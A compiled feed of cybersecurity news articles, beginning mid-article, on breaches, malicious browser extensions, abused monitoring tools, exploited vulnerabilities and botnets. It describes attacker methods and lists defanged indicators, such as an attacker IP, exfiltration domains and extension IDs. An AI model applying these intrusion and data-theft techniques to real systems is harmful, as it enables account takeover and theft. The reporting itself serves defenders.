Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Ransomware crews add 'EDR killers' to their arsenal – and some aren't even malware

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Stalkerware slinger pleads guilty for selling snooper software to suspicious spouses

Apple, Google forced to issue emergency 0-day patches

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 1367 kelime]
Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.

The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.

However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.

"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.

"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."

By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.

While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.

The full scope of the malicious add-on's capabilities is listed below -

Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code

Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.

Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.

Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.

"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.

"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."

Chrome Extensions Hijack VKontakte Accounts

The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.

The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.

The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -

VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)

VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)

Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)

vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)

VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)

One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.

The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.

"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."

VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.

Fake AI Chrome Extensions Steal Credentials, Emails

The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.

"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.

The names of the malicious extensions are as follows -

Chat GPT for Gmail (ID: fpmkabpaklbhbhegegapfkenkmpipick)

Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.

The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.

"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."

287 Chrome Extensions Exfiltrate Browsing History

The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.

A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.

"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.

Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.

Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.

[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:15:00 +0530
Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html

[TAM METİN - 833 kelime]
In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.

Let’s start with the original problem

Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.

To address this, npm made the following changes:

npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.

The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.

In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.

Two important issues remain

First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).

Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.

These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.

To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.

In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.

In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.

Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.

More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.

At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.

In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.

This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.

We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.

In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.

If you’d like to learn more about Chainguard Libraries for JavaScript, reach out to our team.

[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 14:04:00 +0530
Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html

[TAM METİN - 864 kelime]
Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.

BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.

It has been patched in the following versions -

Remote Support - Patch BT26-02-RS, 25.3.2 and later

Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later

The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.

CISA Adds 4 Flaws to KEV Catalog

The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -

CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.

CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.

CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.

CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.

It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.

The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.

However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.

As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.

Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.

The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.

The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.

An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.

"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."

"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."

In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.

[4] BleepingComputer - CISA flags critical Microsoft SCCM flaw as exploited in attacks
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 434 kelime]
CISA ordered U.S. government agencies on Thursday to secure their systems against a critical Microsoft Configuration Manager vulnerability patched in October 2024 and now exploited in attacks.

Microsoft Configuration Manager (also known as ConfigMgr and formerly System Center Configuration Manager, or SCCM) is an IT administration tool for managing large groups of Windows servers and workstations.

Tracked as CVE-2024-43468 and reported by offensive security company Synacktiv, this SQL injection vulnerability allows remote attackers with no privileges to gain code execution and run arbitrary commands with the highest level of privileges on the server and/or the underlying Microsoft Configuration Manager site database.

"An unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the target environment which are processed in an unsafe manner enabling the attacker to execute commands on the server and/or underlying database," Microsoft explained when it patched the flaw in October 2024.

At the time, Microsoft tagged it as "Exploitation Less Likely," saying that "an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product."

However, Synacktiv shared proof-of-concept exploitation code for CVE-2024-43468 on November 26th, 2024, almost two months after Microsoft released security updates to mitigate this remote code execution vulnerability.

While Microsoft has not yet updated its advisory with additional information, CISA has now flagged CVE-2024-43468 as actively exploited in the wild and has ordered Federal Civilian Executive Branch (FCEB) agencies to patch their systems by March 5th, as mandated by the Binding Operational Directive (BOD) 22-01.

"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise," the U.S. cybersecurity agency warned.

"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable."

Even though BOD 22-01 applies only to federal agencies, CISA encouraged all network defenders, including those in the private sector, to secure their devices against ongoing CVE-2024-43468 attacks as soon as possible.

[5] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 04:31:01 -0500
Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/

[TAM METİN - 484 kelime]
Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.

Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.

Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.

As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.

"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.

"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."

Service‑side fix pushed in early February

This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.

Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.

"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."

Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.

[6] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 17:57:54 -0500
Link: https://www.bleepingcomputer.com/news/security/russia-tries-to-block-whatsapp-telegram-in-communication-blockade/

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[7] Krebs on Security - Kimwolf Botnet Lurking in Corporate, Govt. Networks
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 20 Jan 2026 18:19:13 +0000
Link: https://krebsonsecurity.com/2026/01/kimwolf-botnet-lurking-in-corporate-govt-networks/

[TAM METİN - 992 kelime]
A new Internet-of-Things (IoT) botnet called Kimwolf has spread to more than 2 million devices, forcing infected systems to participate in massive distributed denial-of-service (DDoS) attacks and to relay other malicious and abusive Internet traffic. Kimwolf’s ability to scan the local networks of compromised systems for other IoT devices to infect makes it a sobering threat to organizations, and new research reveals Kimwolf is surprisingly prevalent in government and corporate networks.

Image: Shutterstock, @Elzicon.

Kimwolf grew rapidly in the waning months of 2025 by tricking various “residential proxy” services into relaying malicious commands to devices on the local networks of those proxy endpoints. Residential proxies are sold as a way to anonymize and localize one’s Web traffic to a specific region, and the biggest of these services allow customers to route their Internet activity through devices in virtually any country or city around the globe.

The malware that turns one’s Internet connection into a proxy node is often quietly bundled with various mobile apps and games, and it typically forces the infected device to relay malicious and abusive traffic — including ad fraud, account takeover attempts, and mass content-scraping.

Kimwolf mainly targeted proxies from IPIDEA, a Chinese service that has millions of proxy endpoints for rent on any given week. The Kimwolf operators discovered they could forward malicious commands to the internal networks of IPIDEA proxy endpoints, and then programmatically scan for and infect other vulnerable devices on each endpoint’s local network.

Most of the systems compromised through Kimwolf’s local network scanning have been unofficial Android TV streaming boxes. These are typically Android Open Source Project devices — not Android TV OS devices or Play Protect certified Android devices — and they are generally marketed as a way to watch unlimited (read:pirated) video content from popular subscription streaming services for a one-time fee.

However, a great many of these TV boxes ship to consumers with residential proxy software pre-installed. What’s more, they have no real security or authentication built-in: If you can communicate directly with the TV box, you can also easily compromise it with malware.

While IPIDEA and other affected proxy providers recently have taken steps to block threats like Kimwolf from going upstream into their endpoints (reportedly with varying degrees of success), the Kimwolf malware remains on millions of infected devices.

A screenshot of IPIDEA’s proxy service.

Kimwolf’s close association with residential proxy networks and compromised Android TV boxes might suggest we’d find relatively few infections on corporate networks. However, the security firm Infoblox said a recent review of its customer traffic found nearly 25 percent of them made a query to a Kimwolf-related domain name since October 1, 2025, when the botnet first showed signs of life.

Infoblox found the affected customers are based all over the world and in a wide range of industry verticals, from education and healthcare to government and finance.

